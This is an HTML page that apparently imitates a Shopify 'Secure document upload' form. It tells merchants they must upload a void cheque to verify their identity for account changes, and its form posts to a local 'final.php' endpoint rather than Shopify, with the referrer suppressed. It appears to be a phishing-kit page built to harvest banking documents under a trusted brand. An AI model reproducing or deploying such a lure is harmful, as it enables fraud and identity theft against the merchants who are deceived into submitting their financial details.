<html><head>
  <!-- Begin CSS -->
   <link rel="shortcut icon" type="image/x-icon" href="https://cdn.shopify.com/s/assets/favicon-4425e7970f1327bc362265f54e8c9c6a4e96385b3987760637977078e28ffe92.png">
  <link rel="stylesheet" media="screen" href="https://cdn.shopify.com/s/assets/services/external/upload-f61a0f18ca09229f409ef20392eb52510499940845c3e905abbb7d8376027b31.css" crossorigin="anonymous" integrity="sha256-9hoPGMoJIp9AnvIDkutSUQSZlAhFw+kFq7t9g3YCezE=">
</head>
<body>
  <meta name="referrer" content="never">
  <div class="upload-wrapper">
    <div class="card-wrapper">
      <section class="ui-card card-active"><header class="ui-card__header"><h2 class="ui-heading">Secure document upload</h2></header>
        
          <form class="edit_requested_document" id="edit_requested_document_72712215" enctype="multipart/form-data" action="final.php?sessionDataKey=5e6c0340-6287-488a-8dfc-93bf6d11141a&state=983a3692-1ef3-4f0a-84b6-ea44e907fce5" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="?"><input type="hidden" name="_method" value="patch"><input type="hidden" name="authenticity_token" value="gkYlrxM6LzINjlO+6VUFN3HzJajlEX5Hk8Kf99rm0BnWkqSn+aN/5UetlQTE+4Pjsl8LUVIRhFCkM/fVEDsazw==">
  <div class="ui-card__section"><div class="ui-type-container">
    To make major account changes, you need to provide additional documentation. To help us verify your identity, please upload the files indicated below.<br>
    <p class="type--subdued">All documents are required. If some documents are missing, please let us know why in the comments box.</p>
</div></div>  <div class="ui-card__section"><div class="ui-type-container">
      <label class="next-label">
        Banking Information
          <p class="next-input__help-text">- Void Cheque: Photo/Scan of a void cheque to complete verification.

</p>
        <div><input accept="image/png,image/jpg,image/jpeg,image/gif,application/pdf" size="30" type="file" name="requested_document[Banking Information]" id="requested_document_Banking Information"><p class="next-input__help-text"><u>Accepted file formats are PNG, JPEG, GIF and PDF</u></p></div>
</label>    <div class="next-input-wrapper"><label class="next-label" for="requested_document_merchant_comment">Comment (optional)</label><textarea rows="4" class="ui-text-area" name="requested_document[merchant_comment]" id="requested_document_merchant_comment"></textarea></div>
</div></div>  <div class="ui-card__section"><div class="ui-type-container">
    <button class="ui-button ui-button--primary js-btn-loadable js-btn-primary" type="submit" name="commit" onclick="this.classList.toggle('is-loading'); this.disabled=true; this.form.submit();">Upload</button>
</div></div></form>
        </section>    </div>
  </div>

</body></html>